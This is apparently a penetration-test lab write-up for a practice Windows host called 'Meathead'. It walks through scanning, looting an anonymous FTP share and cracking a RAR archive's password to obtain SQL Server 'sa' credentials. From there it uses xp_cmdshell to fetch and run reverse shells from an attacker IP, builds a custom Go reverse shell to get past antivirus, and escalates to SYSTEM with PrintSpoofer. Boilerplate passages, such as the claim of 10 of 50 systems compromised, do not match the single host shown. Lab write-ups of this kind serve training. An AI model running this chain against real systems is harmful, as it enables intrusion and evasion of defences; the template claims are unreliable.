# Meathead
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On $Date, $Author performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the $DomainName domain. During the penetration test, $Author was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| Anonymous FTP login to TCP port 1221.  | ftp, curl |
| Weak password protection for MSSQL_BAK.rar, a file containing credentials. | rar2john, hashcat |
| Poor malware protection. | goshell.go |
| Excessive privileges (SeImpersonatePrivilege) for the "nt service\mssql$sqlexpress" account. | PrintSpoofer64.exe |

## Recommendations
$Author recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
$Author used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of $Author's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, $Author was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: meathead
* Description: Teaches basic pillaging and chaining principals.
* IP Address: 192.168.186.70 
* MAC Address: 00-50-56-BF-0E-AE (ref: sqsh) 
* Domain: MEATHEAD
* Distro: Microsoft Windows Server 2019 Standard (ref: sqsh)
* Kernel: 10.0.17763 N/A Build 17763 (ref: sqsh)
* Architecture: x64 (ref: sqsh)

### Ports
```bash
# Nmap 7.91 scan initiated Sun Aug 29 17:03:49 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/meathead-nmap-complete 192.168.186.70
Nmap scan report for 192.168.186.70
Host is up (0.074s latency).
Not shown: 65535 open|filtered ports, 65527 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1221/tcp open  sweetware-apps
1435/tcp open  ibm-cics
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

# Nmap done at Sun Aug 29 17:08:01 2021 -- 1 IP address (1 host up) scanned in 252.29 seconds
```

### Service Versions
```bash
# Nmap 7.91 scan initiated Sun Aug 29 17:09:06 2021 as: nmap -sV -sC -pT:80,135,139,445,1221,1435,3389,5985 -oN scans/meathead-nmap-versions 192.168.186.70
Nmap scan report for 192.168.186.70
Host is up (0.071s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Plantronics
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1221/tcp open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-27-20  07:02PM                18866 Elementum Supremum.docx
| 04-27-20  07:02PM               764176 file_example_MP3_700KB.mp3
| 04-27-20  07:02PM                15690 img.jpg
| 04-27-20  07:02PM                  302 MSSQL_BAK.rar
| 04-27-20  07:02PM                  548 palindromes.txt
|_04-27-20  07:02PM                45369 server.jpg
| ftp-syst: 
|_  SYST: Windows_NT
1435/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000
| ms-sql-ntlm-info: 
|   Target_Name: MEATHEAD
|   NetBIOS_Domain_Name: MEATHEAD
|   NetBIOS_Computer_Name: MEATHEAD
|   DNS_Domain_Name: Meathead
|   DNS_Computer_Name: Meathead
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-03-10T18:55:34
|_Not valid after:  2051-03-10T18:55:34
|_ssl-date: 2021-08-29T21:10:27+00:00; -2s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MEATHEAD
|   NetBIOS_Domain_Name: MEATHEAD
|   NetBIOS_Computer_Name: MEATHEAD
|   DNS_Domain_Name: Meathead
|   DNS_Computer_Name: Meathead
|   Product_Version: 10.0.17763
|_  System_Time: 2021-08-29T21:09:48+00:00
| ssl-cert: Subject: commonName=Meathead
| Not valid before: 2021-08-28T21:01:37
|_Not valid after:  2022-02-27T21:01:37
|_ssl-date: 2021-08-29T21:10:27+00:00; -2s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-29T21:09:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 29 17:10:30 2021 -- 1 IP address (1 host up) scanned in 84.16 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Sun Aug 29 17:13:45 2021 as: nmap -O -oN scans/meathead-nmap-os 192.168.186.70
Nmap scan report for 192.168.186.70
Host is up (0.076s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 29 17:13:55 2021 -- 1 IP address (1 host up) scanned in 10.77 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### HTTP
TCP port 80.
```bash
dirb http://192.168.186.70 -o scans/meathead-dirb-80-common

# output
---- Scanning URL: http://192.168.186.70/ ----
==> DIRECTORY: http://192.168.186.70/css/                                                                                             
==> DIRECTORY: http://192.168.186.70/images/                                                                                          
==> DIRECTORY: http://192.168.186.70/Images/                                                                                          
==> DIRECTORY: http://192.168.186.70/master/                                                                                          
---- Entering directory: http://192.168.186.70/css/ ----
---- Entering directory: http://192.168.186.70/images/ ----
---- Entering directory: http://192.168.186.70/Images/ ----
---- Entering directory: http://192.168.186.70/master/ ----
```

### MSRPC
TCP port 135.
```bash
rpcclient -U '' 192.168.186.70

# output
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

### NetBIOS
TCP port 139.
```bash
nbtscan 192.168.186.70

# output
Doing NBT name scan for addresses from 192.168.186.70

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
```

### SMB
TCP port 445.
```bash
smbclient -L 192.168.186.70

# output
Enter WORKGROUP\victor's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
```

### FTP
TCP port 1221.
```bash
ftp 192.168.186.70 1221 # anonymous:anonymous

# output
Connected to 192.168.186.70.
220 Microsoft FTP Service
Name (192.168.186.70:victor): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

```bash
curl ftp://anonymous:anonymous@192.168.186.70:1221

# output
04-27-20  07:02PM                18866 Elementum Supremum.docx
04-27-20  07:02PM               764176 file_example_MP3_700KB.mp3
04-27-20  07:02PM                15690 img.jpg
04-27-20  07:02PM                  302 MSSQL_BAK.rar
04-27-20  07:02PM                  548 palindromes.txt
04-27-20  07:02PM                45369 server.jpg
```

```bash
cd loot/
wget -m ftp://192.168.186.70:1221 -nd
ls -al

# output
total 852
drwxr-xr-x 2 victor victor   4096 Aug 29 17:55  .
drwxr-xr-x 6 victor victor   4096 Aug 29 17:55  ..
-rw-r--r-- 1 victor victor  18866 Apr 27  2020 'Elementum Supremum.docx'
-rw-r--r-- 1 victor victor 764176 Apr 27  2020  file_example_MP3_700KB.mp3
-rw-r--r-- 1 victor victor  15690 Apr 27  2020  img.jpg
-rw-r--r-- 1 victor victor    340 Aug 29 17:55  .listing
-rw-r--r-- 1 victor victor    302 Apr 27  2020  MSSQL_BAK.rar
-rw-r--r-- 1 victor victor    548 Apr 27  2020  palindromes.txt
-rw-r--r-- 1 victor victor  45369 Apr 27  2020  server.jpg
```

### Microsoft SQL Server
TCP port 1435.
```bash
sqsh -S 192.168.186.70:1435 -U sa -P EjectFrailtyThorn425

# output
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> 
```

### RDP
TCP port 3389.
```bash
xfreerdp /u:sa /p:EjectFrailtyThorn425 /cert:ignore /workarea /v:192.168.186.70

# output
NSTR
```

### WinRM
TCP port 5985.
```bash
evil-winrm -u sa -p "EjectFrailtyThorn425" -i 192.168.186.70

# output
NSTR
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, $Author was able to successfully gain access to 10 out of the 50 systems.

### Password Guessing  
#### Credentials
* Application
  * sa:EjectFrailtyThorn425
* Operating System
  * jane
  * administrator

```bash
sudo apt install unrar
unrar e MSSQL_BAK.rar

# output
UNRAR 6.00 freeware      Copyright (c) 1993-2020 Alexander Roshal

Enter password (will not be echoed) for MSSQL_BAK.rar:
```

```bash
rar2john MSSQL_BAK.rar > MSSQL_BAK.hash
cat MSSQL_BAK.hash | grep -E -o '(\$RAR3\$[^:]+)|(\$rar5\$.*)' > rar.hash
cat rar.hash

# output
$rar5$16$53b1acf5cd3d02dafdf50f1cb79e46e5$15$a8761ee8f467302d9ee19284f60713dd$8$514688ceb07cab7b
```

```bash
hashcat -m 13000 -a 0 rar.hash /usr/share/wordlists/rockyou.txt 

# output
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 2880/2944 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$rar5$16$53b1acf5cd3d02dafdf50f1cb79e46e5$15$a8761ee8f467302d9ee19284f60713dd$8$514688ceb07cab7b:letmeinplease
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: RAR5
Hash.Target......: $rar5$16$53b1acf5cd3d02dafdf50f1cb79e46e5$15$a8761e...7cab7b
Time.Started.....: Sun Aug 29 18:30:06 2021 (3 mins, 20 secs)
Time.Estimated...: Sun Aug 29 18:33:26 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      695 H/s (10.99ms) @ Accel:256 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 139264/14344385 (0.97%)
Rejected.........: 0/139264 (0.00%)
Restore.Point....: 138240/14344385 (0.96%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:32768-32799
Candidates.#1....: mollete -> katong

Started: Sun Aug 29 18:29:49 2021
Stopped: Sun Aug 29 18:33:27 2021
```

```bash
unrar -e MSSQL_BAK.rar

# output
UNRAR 6.00 freeware      Copyright (c) 1993-2020 Alexander Roshal

Enter password (will not be echoed) for MSSQL_BAK.rar: 


Extracting from MSSQL_BAK.rar

Extracting  mssql_backup.txt                                          OK 
All OK
```

```bash
cat mssql_backup.txt

# output
Username: sa
Password: EjectFrailtyThorn425
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. $Author added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.


### Privilege Escalation
```bash
EXEC xp_cmdshell 'whoami'

# output
nt service\mssql$sqlexpress
```

```bash
SELECT name, password_hash FROM master.sys.sql_logins

# output
sa                                                                                                                             
0x0200de9b93bf476638af8c30c7774c814af24d92fcfda4a1e50fee2b86ba6d9d39d90e476930a8629d5b7fd0e28a5492d858097b6caa106ef21d9b1f957cc811e849e22cb5ae                                                                                                                        
                                                                                                                                       
##MS_PolicyEventProcessingLogin##                                                                                              
0x0200709fd2f131c8ce332d3c5075357dfd66ed0656370f9a72c938d91ac64f67c4d39ab1d494d05b17abe67a543ef029bc429314d65beabb140783752b0d83c51e3fc84d51e5                                                                                                                        

##MS_PolicyTsqlExecutionLogin##                                                                                                
0x020060607d4ea2c6b2520cc84444fe4f8b5c02409f1b381a82391229eb5d49d1f53f74ffed4167ece54a7e9295af4aa1630eae1fd7737f6b7d0f6798109e2ab972e16b4ca4bf  
```

```bash
EXEC xp_cmdshell 'powershell -c "test-netconnection 192.168.49.186 -port 1435"'

# output
TcpTestSucceeded : True
```

```bash
sudo nc -nvlp 1435

# output
listening on [any] 1435 ...
connect to [192.168.49.186] from (UNKNOWN) [192.168.186.70] 49867
```

```bash
EXEC xp_cmdshell 'echo hello > c:\users\public\poo.txt'

# output
(1 row affected, return status = 0)
```

```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.186.70 LPORT=1435 -f exe -o rshell.exe

# output
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rshell.exe
```

```bash
EXEC xp_cmdshell 'powershell -c "iwr http://192.168.49.186/rshell.exe -outfile c:\users\public\rshell.exe"'
EXEC xp_cmdshell 'dir c:\users\public\rshell.exe'

# output
08/30/2021  02:40 AM             7,168 rshell.exe 
```

```bash
EXEC xp_cmdshell 'powershell -c "start-process c:\users\public\rshell.exe"'

# output
This command cannot be run due to the error: Operation did not complete successfully because the file contains a virus or potentially unwanted software.
```

```bash
cd exploits/
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -o Invoke-PowerShellTcp.ps1
sudo python3 -m http.server 80
```

```bash
sudo nc -nvlp 1435
```

```bash
EXEC xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(\"http://192.168.49.186/Invoke-PowerShellTcp.ps1\"); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.49.186 -Port 1435'

# output
This script contains malicious content and has been blocked by your antivirus software.
```

```bash
vim goshell.go
```

```bash
package main

import (
    "net"
    "os/exec"
    "syscall"
)

func main() {
    socket, _ := net.Dial("tcp", "192.168.49.186:1435")
    dagger := exec.Command("cmd.exe")
    dagger.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    dagger.Stdin = socket
    dagger.Stdout = socket
    dagger.Stderr = socket
    dagger.Run()
}
```

```bash
env GOOS=windows GOARCH=386 go build -ldflags -H=windowsgui goshell.go
```

```bash
EXEC xp_cmdshell 'powershell -c "iwr http://192.168.49.186/goshell.exe -outfile c:\users\public\goshell.exe"'

# output
(1 row affected, return status = 0)
```

```bash
EXEC xp_cmdshell 'powershell -c "start-process c:\users\public\goshell.exe"'

# output
(1 row affected, return status = 0)
```

Checking privileges (vulnerable to PrintSpoofer?).
```bash
EXEC xp_cmdshell 'whoami /priv'

# output
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

```bash
cd exploits/
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe
sudo python3 -m http.server 80
```

```bash
cd c:\users\public\
powershell -c "iwr http://192.168.49.186/PrintSpoofer.exe -outfile c:\users\public\PrintSpoofer.exe"
PrintSpoofer.exe -i -c cmd

# output
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.1217]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```bash
whoami

# output
nt authority\system
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, $Author removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
Paths not explored.
```bash
EXEC xp_cmdshell 'dir "c:\Program Files"'

# output
04/27/2020  06:42 PM    <DIR>          Plantronics
```

```bash
EXEC xp_cmdshell 'powershell -c "gwmi win32_product | ? { $_.Name -like \"Plant*\"} | select Name, Version"'

# output
Plantronics Hub Software 3.13.52516.41952
```

```bash
EXEC xp_cmdshell 'powershell -c "gwmi win32_service | ? { $_.Name -like \"Plant*\"} | select Name, StartName"'

# output
PlantronicsUpdateService LocalSystem
```
